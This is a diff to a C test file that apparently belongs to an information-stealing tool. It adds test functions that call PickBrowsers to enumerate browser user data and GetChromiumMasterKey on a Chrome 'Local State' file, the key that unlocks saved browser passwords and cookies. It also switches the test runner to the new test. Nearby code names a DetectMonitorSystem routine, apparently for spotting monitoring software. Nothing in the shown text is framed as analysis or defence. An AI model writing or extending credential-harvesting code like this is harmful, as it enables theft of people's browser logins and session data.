@@ -1877,6 +1877,27 @@ void test116(void) {
 	FREE(pResult);
 }
 
+void test117(void) {
+	DWORD dwNumberOfUserDatas = 0;
+	PUSER_DATA* pResult = NULL;
+	DWORD i = 0;
+
+	pResult = PickBrowsers(&dwNumberOfUserDatas);
+	for (i = 0; i < dwNumberOfUserDatas; i++) {
+		FreeUserData(pResult[i]);
+	}
+
+	FREE(pResult);
+}
+
+void test118() {
+	USER_DATA UserData;
+
+	SecureZeroMemory(&UserData, sizeof(UserData));
+	UserData.lpKeyPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", 0);
+	GetChromiumMasterKey(&UserData);
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -2105,7 +2126,9 @@ int main(void) {
 	//test113();
 	//test114();
 	//test115();
-	test116();
+	//test116();
+	test117();
+	//test118();
 	//Final();
 	return 0;
 }
